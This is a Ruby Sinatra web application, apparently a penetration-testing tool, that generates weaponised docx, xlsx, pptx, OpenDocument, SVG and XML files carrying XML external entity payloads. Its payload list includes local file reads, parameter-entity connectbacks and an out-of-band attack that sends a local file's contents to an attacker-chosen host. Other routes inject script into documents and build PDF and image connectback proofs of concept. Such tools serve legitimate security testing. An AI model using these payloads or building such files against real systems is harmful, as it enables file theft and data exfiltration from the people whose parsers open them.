# encoding: ASCII-8BIT
require 'rubygems'
require 'sinatra'
require 'haml'
require 'zipruby'
require 'net/ldap'
require 'json'
require 'fileutils'
require 'optparse'
require 'json'

require './lib/util'
require './model/master'

if not File.file?('./db/master.db')
    puts "|+| Database does not exist, initializing a blank one."
    out_file = File.new("./db/master.db", "w")
    out_file.puts("")
    out_file.close
end

# TODO apply to all xml in docx
# TODO http://stackoverflow.com/questions/34746900/sparkjava-upload-file-didt-work-in-spark-java-framework
# TODO add help about payloads (modal button on abll payload type screens)
# TODO add help about uploading your own documents
# TODO add payload descriptions
# TODO have file descriptions show XML payload

set :options, JSON.parse(File.read('./options.json'))
set :protocols, ["http","https","ftp","jar","file","netdoc","mailto","gopher","none"]
set :types, ["docx","pptx","xlsx","svg","odt","xml","odg","odp","ods"]
set :poc_types, ["pdf","jpg","gif"]

# Keep the payloads organized
def read_payloads()
	pl = {}
	pl[ "Remote DTD public check"] = ['<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/EXF">']
	pl["Canary XML Entity"] = ['<!DOCTYPE root [<!ENTITY xxe "XE_SUCCESSFUL">]>']
	pl["External XML Entity"] = ['<!DOCTYPE root [<!ENTITY xxe SYSTEM "FILE">]>']
	pl["Recursive XML Entity"] = ['<!DOCTYPE root [<!ENTITY b "XE_SUCCESSFUL"><!ENTITY xxe "RECURSE &b;&b;&b;&b;">]>']
	pl["Plain Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>']
	pl["Recursive Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>']
	pl["Parameter Entity Connectback"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "IP/EXF">%a;]>']
	pl["Out of Bounds Attack"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % a SYSTEM "IP/EXF">%a;]>']
	return pl
end

def oxml_file_defaults()
	d = {}
	d["docx"] = ["samples/sample.docx", "word/document.xml"]
	d["xlsx"] = ["samples/sample.xlsx", "xl/workbook.xml"]
	d["pptx"] = ["samples/sample.pptx", "ppt/presentation.xml"]
	d["odt"] =  ["samples/sample.odt", "content.xml"]
	d["odg"] =  ["samples/sample.odg", "content.xml"]
	d["odp"] =  ["samples/sample.odp", "content.xml"]
	d["ods"] =  ["samples/sample.ods", "content.xml"]

	return d
end

set :payloads, read_payloads

get '/' do
	redirect to("/build")
end

get '/build' do
	@types = settings.types
	@payloads = settings.payloads
	@protos = settings.protocols
	haml :build, :encode_html => true
end

post '/build' do
	oxmls = oxml_file_defaults()
	pl = read_payloads()

	if params["proto"] == "none"
		ip = params["hostname"]
	else
		# TODO is this correct for all protocols?
		ip = params["proto"]+"://"+params["hostname"]
	end

	if params[:file] != nil
		# TODO support svg
		# TODO support xml
		input_file = params[:file][:tempfile].read
		nname = "temp_#{Time.now.to_i}_"
		ext = params[:file][:filename].split('.').last
		rand_file = "./output/#{nname}_z.#{ext}"
		File.open(rand_file, 'wb') {|f| f.write(input_file) }
		file_exploit = rand_file
	end

	if oxmls.include?(params["file_type"])
		xml_file = params["xml_file"] ? params["xml_file"] : oxmls[params["file_type"]][1]
		file_exploit = oxmls[params["file_type"]][0]
		fn = insert_payload_docx(file_exploit,xml_file,pl[params["payload"]][0],ip,params["exfil_file"])
	elsif params["file_type"] == "svg"
		fn = insert_payload_svg("./samples/sample.svg",pl[params["payload"]][0],ip,params["exfil_file"])
	elsif params["file_type"] == "xml"
		fn = insert_payload_xml("./samples/sample.xml",pl[params["payload"]][0],ip,params["exfil_file"])
	end

	# write entry to database
	file = Oxfile.new
	file.filename = fn.split('/').last
	file.location = fn
	file.desc = URI.escape(params["desc"])
	file.type = params["file_type"]
	file.save

	send_file(fn, :filename => "#{fn.split('/').last}")
end

get '/replace' do
	@types = settings.types
	@payloads = settings.payloads
	@protos = settings.protocols
	haml :replace, :encode_html => true
end

post '/replace' do
	if params[:file] == nil
		return "Error no file included"
	end

	pl = read_payloads()

	if params["proto"] == "none"
		ip = params["hostname"]
	else
		# TODO is this correct for all protocols
		ip = params["proto"]+"://"+params["hostname"]
	end

	input_file = params[:file][:tempfile].read
	nname = "temp_#{Time.now.to_i}_"
	ext = params[:file][:filename].split('.').last
	rand_file = "./output/#{nname}_z.#{ext}"
	File.open(rand_file, 'wb') {|f| f.write(input_file) }

	# TODO logic check if svg or xml
	# TODO modify uri

	fn = string_replace(pl[params["payload"]][0],rand_file,ip,params["exfil_file"])

	if fn == "|-|"
		"|-| Could not find § in document, please verify."
	else
		# write entry to database
		file = Oxfile.new
		file.filename = fn.split('/').last
		file.location = fn
		file.desc = URI.escape(params["desc"])
		file.type = fn.split('.	').last
		file.save

		send_file(fn, :filename => "#{fn.split('/').last}")
	end
end

get '/xss' do
	haml :xss, :encode_html => true
end

post '/xss' do
	if params[:file] == nil
		return "Error no file included"
	end

	input_file = params[:file][:tempfile].read
	nname = "temp_#{Time.now.to_i}_"
	ext = params[:file][:filename].split('.').last
	rand_file = "./output/#{nname}_z.#{ext}"
	File.open(rand_file, 'wb') {|f| f.write(input_file) }

	# TODO logic check if svg or xml
	# TODO modify uri
	# TODO sanitize double quote
	# TODO add a supported types box
	# TODO add a non-entity replacement option

	xss = "<!DOCTYPE root [<!ENTITY xxe \"#{params[:xss]}\">]>"
	xss = "<!DOCTYPE root [<!ENTITY xxe \"<![CDATA[#{params[:xss]}]>\">]>" if params[:cdata]

	fn = string_replace(xss,rand_file,"","")

	if fn == "|-|"
		"|-| Could not find § in document, please verify."
	else
		# write entry to database
		file = Oxfile.new
		file.filename = fn.split('/').last
		file.location = fn
		file.desc = URI.escape(params["desc"])
		file.type = fn.split('.').last
		file.save

		send_file(fn, :filename => "#{fn.split('/').last}")
	end
end

get '/poc' do
	@types = settings.poc_types
	@protos = settings.protocols

	haml :poc, :encode_html => true
end

post '/poc' do
	if params["proto"] == "none"
		ip = params["hostname"]
	else
		# TODO is this correct for all protocols?
		ip = params["proto"]+"://"+params["hostname"]
	end

	if params["file_type"] == "pdf"
		fn = pdf_poc(ip)
	elsif params["file_type"] == "gif"
		fn = gif_poc(ip)
	elsif params["file_type"] == "jpg"
		fn = jpg_poc(ip)
	end

	send_file fn, :type => params["file_type"], :filename => "#{fn.split('/').last}"

	haml :poc, :encode_html => true
end

get '/list' do
	@files = Oxfile.all()

	haml :list, :encode_html => true
end

# TODO check CDATA working correctly

get '/download' do
	# check if params is set
	file = Oxfile.first(:id => params["id"])

	send_file file.location, :filename => file.filename
end

get '/display' do
	haml :display, :encode_html => true
end

post '/display_file' do
	if params[:file] == nil
		return "Error no file included"
	end

	input_file = params[:file][:tempfile].read
	nname = "temp_#{Time.now.to_i}_"
	ext = params[:file][:filename].split('.').last
	rand_file = "./output/#{nname}_z.#{ext}"
	File.open(rand_file, 'wb') {|f| f.write(input_file) }

	@files = display_file(rand_file)
	haml :display_file, :encode_html => true
end

get '/view_file' do
	if params[:id] == nil
		return "Error no file included"
	end

	file = Oxfile.first(:id => params["id"])
	rand_file = file.location

	@files = display_file(rand_file)
	haml :display_file, :encode_html => true
end

get '/delete' do
	file = Oxfile.first(:id => params["id"])
	file.destroy if file
	redirect '/list'
end

get '/help' do
	haml :help
end